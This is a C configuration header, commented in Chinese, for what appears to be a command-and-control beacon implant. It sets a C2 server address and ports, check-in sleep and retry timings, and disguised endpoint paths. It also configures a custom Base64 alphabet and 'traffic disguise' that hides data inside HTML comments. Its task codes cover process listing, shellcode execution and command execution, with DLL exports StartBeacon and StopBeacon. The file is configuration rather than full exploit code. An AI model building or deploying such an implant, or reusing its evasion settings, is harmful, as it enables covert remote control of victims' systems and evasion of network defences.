#ifndef CONFIG_H
#define CONFIG_H

// 编译模式配置
// 定义 BUILD_DLL 来编译成DLL，否则编译成EXE
// #define BUILD_DLL

// Beacon版本信息
#define BEACON_VERSION "1.0.0"

// 服务器配置
#define SERVER_HOST L"127.0.0.1"
#define SERVER_PORT 8080
#define USE_HTTPS 0             // 启用HTTPS (0=HTTP, 1=HTTPS)
#define HTTPS_PORT 8443          // HTTPS端口

// 通信配置
#define INITIAL_SLEEP_TIME 10
#define RETRY_INTERVAL 60
#define MAX_RETRIES 3
#define CLIENT_TOKEN L"Demo"

// 端点配置 - 与服务器config.json中的routes配置对应
#define API_ENDPOINT L"/api.jsp"        // 对应 beacon_endpoint
#define REGISTER_ENDPOINT L"/sync_debug"  // 对应 register_path

// 编码配置
#define USE_CUSTOM_BASE64 1  // 启用自定义Base64编码表
#define CUSTOM_BASE64_TABLE "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789+/"

// 流量伪装配置
#define ENABLE_TRAFFIC_DISGUISE 1  // 启用流量伪装
#define TRAFFIC_PREFIX "<!--"      // 数据前缀
#define TRAFFIC_SUFFIX "-->"       // 数据后缀

// 系统配置
#define REG_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"

// 缓冲区大小配置
#define MAX_BUFFER_SIZE (10 * 1024 * 1024)  // 10MB，支持大型进程列表
#define INITIAL_BUFFER_SIZE (8 * 1024)      // 8KB
#define MAX_PATH_LENGTH 2048
#define UUID_LENGTH 37

// DLL导出函数名称
#ifdef BUILD_DLL
#define EXPORT_FUNCTION_NAME "StartBeacon"
#define EXPORT_STOP_FUNCTION_NAME "StopBeacon"
#endif

// 任务类型定义
typedef enum {
    TASK_NULL = 0x00,
    TASK_SLEEP = 0x1A,
    TASK_PROCLIST = 0x1B,
    TASK_SHELLCODE = 0x1C,
    TASK_EXECUTE = 0x1D,
    TASK_UNKNOWN = 0xFF
} TASK_TYPE;

// 错误码定义
typedef enum {
    BEACON_SUCCESS = 0,
    BEACON_ERROR_PARAMS = 1,
    BEACON_ERROR_MEMORY = 2,
    BEACON_ERROR_NETWORK = 3,
    BEACON_ERROR_SYSTEM = 4,
    BEACON_ERROR_SERVER_SHUTDOWN = 5
} BEACON_ERROR;

#endif // CONFIG_H 